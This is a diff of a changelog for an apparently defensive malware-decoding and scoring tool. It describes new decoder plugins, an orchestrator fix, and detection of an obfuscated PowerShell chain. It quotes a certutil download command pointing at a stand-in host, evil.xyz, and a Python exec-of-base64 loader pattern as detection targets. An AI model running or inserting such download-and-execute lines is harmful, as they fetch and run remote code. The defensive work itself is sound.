@@ -43,33 +43,38 @@ RC2.1a delivers **Malware Family Intelligence** as first-class MCIP output:
 - Post-decode intelligence pass with terminal-state promotion
 - Backwards-compatible API (all existing fields preserved)
 
-## 🟢 RC2.2 · SHIPPED — 2026-07-20 (Decoder Expansion + Universal File Ingest + Custom-Obfuscator Chain)
+## 🟢 RC2.2+ · SHIPPED — 2026-07-20 (Workspace ↔ Orchestrator Unification)
 
-**Branch:** `feature/rc2` · **Tests:** 201/201 engine green (73 new · zero regressions)
+**Branch:** `feature/rc2` · **Tests:** 214/214 engine green (86 new · zero regressions)
 **Safepoint tag:** `v1.0.0-RC2.2-safepoint-20260719-122658`
-**Test files:** `test_rc22_decoder_pack.py`, `test_file_ingest_and_miner.py`, `test_sample_commandline_chain.py`
 
-### Sophisticated 8-layer chain now decoded end-to-end
-Real production sample (`Sample_Commandline.rtf`) used this obfuscation stack:
-1. `powershell.exe -e <B64>` outer wrapper
-2. Base64 inner
-3. Custom `XXx\XXx\` hex-with-separator format (`custom-hex-slash` plugin — new)
-4. Nibble-swap byte transform (`nibble-swap` plugin — new)
-5. Reversed Base64 (`reverse-string` — enhanced to detect leading `=`)
-6. Base64 (inner-inner)
-7. URL / percent-decode
-8. `certutil.exe -urlcache -split -f http://evil.xyz` → LOLBAS + URL IOC
+### 🔥 Workspace + Batch Analyst now share ONE decoder engine
 
-Bumped `Budget.max_depth = 20` (was 12) so deeply-nested loaders can fully unwind.
+Fixes the Prod bug where `AUTO INVESTIGATE` on the Workspace tab showed
+`BENIGN 0/100 · No techniques matched` for the SAME payload that Batch
+Analyst decoded to `MALICIOUS · 90 · http://evil.xyz`.
 
-### Part A — Decoder pack (RC2.2)
-9 new deterministic plugins: `utf16-decode`, `ps-reconstruct`, `data-uri-extract`, `ioc-extractor`, `base58-decode`, `jwt-decode`, `reverse-string`, `custom-hex-slash`, `nibble-swap`.
+`analysis_core.deterministic_best_decode()` now runs a **preflight through
+the new RC2.2 Orchestrator** before falling back to the legacy smart/magic
+race. When the orchestrator produces ≥2 layers with a clean terminal state,
+its result is adopted verbatim — same output shape (so no frontend break),
+but with RC2.2 plugins in the chain (`custom-hex-slash`, `nibble-swap`,
+`reverse-string`, `ps-reconstruct`, `utf16-decode`, `data-uri-extract`,
+`ioc-extractor`, `python-exec` wrapper, family plugins).
 
-### Part B — Universal file ingest for Batch Analyst
-Endpoints `POST /api/batch/test/mine/preview` and `POST /api/batch/test/mine` accept
-34+ file formats (.docx, .pdf, .xlsx, .pptx, .html, .htm, .eml, .rtf, .json, .yaml,
-.zip, .tar, .tgz, .gz, .txt, .log, .md, all common script extensions) and archives.
-Frontend button **"MINE FROM ANY FILE"** on `/batch-test`.
+Adapter module: `backend/rc22_adapter.py`
+Test lock: `backend/tests/test_rc22_workspace_adapter.py` (6 tests)
+
+### Sophisticated 8-layer chain still holds
+Real production sample (`Sample_Commandline.rtf`) chain:
+`powershell -e → base64 → custom-hex-slash → nibble-swap → reverse-string →
+base64 → url-decode → cmd/certutil wrapper → ioc-extractor` → `MALICIOUS 90`.
+
+### Python exec wrapper (2026-07-20 late)
+Real customer bug: `python -c "exec(__import__('base64').b64decode(b'…').decode())"`
+was scoring `BENIGN 0/100`. Added regex + T1059.006 (Python) + python.exe LOLBAS
++ `python-exec-b64` HIGH tradecraft flag. Now scores `SUSPICIOUS 67`.
+Test lock: `backend/tests/test_python_exec_wrapper.py` (5 tests).
 
 ## 🟡 Next up · RC2.1b · STIX 2.1 Bundle Export (1.5 days)
 
